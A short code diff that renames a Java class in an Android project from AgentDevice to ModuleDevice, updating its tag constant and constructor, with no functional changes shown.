@@ -41,10 +41,10 @@ import com.android.service.util.WChar;
  * @author zeno
  * 
  */
-public class AgentDevice extends BaseInstantModule {
+public class ModuleDevice extends BaseInstantModule {
 
 	/** The Constant TAG. */
-	private static final String TAG = "AgentDevice"; //$NON-NLS-1$
+	private static final String TAG = "ModuleDevice"; //$NON-NLS-1$
 
 	/** The process list. */
 	private boolean processList = true;
@@ -61,7 +61,7 @@ public class AgentDevice extends BaseInstantModule {
 	/**
 	 * Instantiates a new device agent.
 	 */
-	public AgentDevice() {
+	public ModuleDevice() {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " DeviceAgent constructor");//$NON-NLS-1$
 		}
